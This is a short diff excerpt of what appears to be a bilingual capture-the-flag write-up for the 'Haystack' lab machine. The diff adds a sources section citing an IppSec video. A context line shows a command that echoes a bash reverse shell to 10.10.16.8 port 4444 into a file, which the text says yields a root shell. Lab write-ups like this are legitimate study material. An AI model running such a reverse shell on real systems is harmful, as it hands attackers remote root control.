@@ -280,3 +280,7 @@ echo 'Ejecutar comando: bash -i >& /dev/tcp/10.10.16.8/4444 0>&1' >
 ```
 
 Just wait a few seconds and get the root shell.
+
+## Fuentes / Sources
+
+- [IppSec: Haystack (video)](https://youtube.com/watch?v=oGO9MEIz_tI) - IppSec - fecha de acceso: 2026-09-24.
